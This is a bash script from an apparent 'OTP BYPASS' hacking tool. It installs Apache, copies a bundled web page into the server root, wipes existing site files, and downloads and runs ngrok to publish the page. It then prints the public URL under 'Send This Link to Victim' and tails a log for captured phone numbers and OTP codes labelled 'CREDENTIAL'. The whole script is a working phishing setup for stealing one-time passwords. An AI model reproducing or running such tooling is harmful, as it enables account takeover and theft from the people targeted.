#!/bin/bash 
 cat Launch.txt
sleep 4
 echo -e "\e[1;31m REQUIREMENT : ROOT! INTERNET! APACHE SERVER! \e[0m" 
 echo -e "\e[1;37m                   Devolopers assume no liability and are not Responsible!, TOOL DEVELOPED BY TERMUX-ANDROID-HACKERS ADMIN \e[0m"



                                      


sleep 6
# spinner
spinlong ()
{
   bar=" +++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
   barlenght=${#bar}
   i=o
   while ((i < 100 )); do
	   n=$((i*barlenght / 100 ))
	   printf "\e[00;32m\r[%-${barlenght}s]\e[00m" "${bar:0:n}"
	   ((i += RANDOM%5+2))
	   sleep 0.4
   done
}


#clolors
white='\e[1;37m'
green='\e[0;32m'
blue='\e[1;34m'
red='\e[1;31m'
yellow='\e[1;33m' 
echo ""
echo ""
echo ""
                echo""
                                  
             echo -e $green            "                          ┌─┐┬  ┌─┐   ┌─┐┌┬┐┌─┐  ┌┐ ┬ ┬┌─┐┌─┐┌─┐┌─┐        "
             echo -e $green            "                          │ ││  ├─┤───│ │ │ ├─┘  ├┴┐└┬┘├─┘├─┤└─┐└─┐        "
             echo -e $green            "                          └─┘┴─┘┴ ┴   └─┘ ┴ ┴    └─┘ ┴ ┴  ┴ ┴└─┘└─┘        "
             echo -e $white            "                       +++++++++++++++++ OTP BYPASS ++++++++++++++++++     "

                echo""
                echo""
                echo""
                sudo apt-get install apache2
                apt install jq
                apt install tail
	        hostnamectl
                systemctl start apache2
		apt install xterm
		apt install gnome-terminal
		systemctl restart apache2.service
		mkdir /var
		mkdir /var/www
		mkdir /var/www/html
		mv /var/www/html/* /var/www/
		rm -rf /var/www/html/*
		cp -R * /var/www/html/
		cd ..
		cd /var/www/html/
		wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
                unzip ngrok-stable-linux-amd64.zip
                chmod +x *
		chmod 7777 *
		sleep 6
	        echo""
                echo""
                echo""
                gnome-terminal -x bash -c "./ngrok http 80; exec bash"
                echo ""
                echo ""
                echo ""
                echo    -e $white "+++++++++++++++++++++++++++++++++++++++++++++++ >>>>>>>>>>>>>>>>>> +++++++++++++++++++++++++++++++++++ >>>>>>>>>>>>>>>>>>>>> +++++++++++++++++ "
		echo ""
                echo ""
                sleep 7
                echo ""                          
                echo   -e $yellow "// [ Send This Link to Victim ] //"
                echo ""
                curl -s localhost:4040/api/tunnels | jq -r .tunnels[1].public_url
                curl -s localhost:4040/api/tunnels | jq -r .tunnels[0].public_url
                echo ""
                echo ""
                echo -e $green "//  [ CREDENTIAL ] //"
                echo ""
                tail -f log.txt | grep -e "number" -e "otp" -e "OTP"



                ;;
	        